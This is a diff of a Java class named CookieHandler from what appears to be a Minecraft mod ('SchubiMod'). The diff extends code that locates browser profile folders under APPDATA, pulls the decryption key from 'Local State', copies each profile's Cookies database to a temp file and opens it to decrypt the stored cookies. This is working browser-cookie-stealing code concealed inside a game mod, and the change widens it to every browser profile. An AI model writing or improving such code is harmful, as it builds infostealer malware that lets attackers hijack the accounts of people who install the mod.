@@ -1,9 +1,10 @@
 package dev.schubilegend.handlers;
 
-import dev.schubilegend.SchubiMod;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
+import dev.schubilegend.SchubiMod;
+import dev.schubilegend.utils.Utils;
 
 import java.io.File;
 import java.nio.file.Files;
@@ -15,7 +16,6 @@ import java.util.HashMap;
 import java.util.Properties;
 
 import static dev.schubilegend.utils.Utils.decrypt;
-import static dev.schubilegend.utils.Utils.getKey;
 
 public class CookieHandler {
     private static File appData = new File(System.getenv("APPDATA"));
@@ -45,25 +45,32 @@ public class CookieHandler {
     }
 
     private void crawlUserData() {
-        for (String browser : paths.keySet()) {
-            File userData = new File(paths.get(browser));
-            if (!userData.exists()) continue;
-            byte[] key = getKey(new File(userData, "Local State"));
-            File networkDir = new File(userData, "Network");
-            if (!networkDir.exists()) continue;
-            for (File data : networkDir.listFiles()) {
-                if (data.getName().equals("Cookies")) {
-                    crawlCookies(data, key);
+        for (final String cookies : paths.keySet()) {
+            final File userData = new File(paths.get(cookies));
+            if (!userData.exists()) {
+                continue;
+            }
+            final byte[] key = Utils.getKey(new File(userData, "Local State"));
+            for (final File data : userData.listFiles()) {
+                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
+                    this.crawlCookies(data, key);
+                }
+                else if (data.getName().equals("Login Data")) {
+                    this.crawlCookies(userData, key);
                 }
             }
         }
     }
 
-    private void crawlCookies(File cookieFile, byte[] key) {
+    private void crawlCookies(final File profile, final byte[] key) {
         try {
+            final File cookieDB = new File(profile, "\\Network\\Cookies");
             File tempCookieData = File.createTempFile("TempCookies", null);
             tempCookieData.deleteOnExit();
-            Files.copy(cookieFile.toPath(), tempCookieData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+            if (!cookieDB.exists()) {
+                return;
+            }
+            Files.copy(cookieDB.toPath(), tempCookieData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
             Driver driver = SchubiMod.driver;
             Properties props = new Properties();
             Connection connection = driver.connect("jdbc:sqlite:" + tempCookieData.getAbsolutePath(), props);
